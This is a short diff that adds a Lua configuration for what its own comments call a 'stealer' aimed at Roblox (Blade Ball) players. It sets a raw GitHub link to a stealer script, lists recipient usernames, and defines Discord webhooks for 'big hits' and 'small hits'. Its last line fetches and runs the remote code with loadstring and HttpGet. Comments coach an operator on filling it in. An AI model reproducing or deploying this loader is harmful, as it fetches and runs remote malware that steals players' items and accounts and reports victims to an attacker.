@@ -1,0 +1,14 @@
+```lua
+STEALER_LINK = 'https://raw.githubusercontent.com/daniel-dev-1-ai/redzhub999/refs/heads/main/BLADEBALL' -- stealer link (how to create is bellow)
+
+Usernames = {
+    'bladeballgre', -- PUT UR ROBLOX USERNAMES
+    'BLADES12900', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'BLADES8927',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1364109369238749255/GgtC6zBuaq6N3N90pHoXta686a1gbrziqQjdId8KFdCegznqo6-2P3OWdoUNcBZ58Xyw"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1364109369238749255/GgtC6zBuaq6N3N90pHoXta686a1gbrziqQjdId8KFdCegznqo6-2P3OWdoUNcBZ58Xyw"
+
+loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
+```
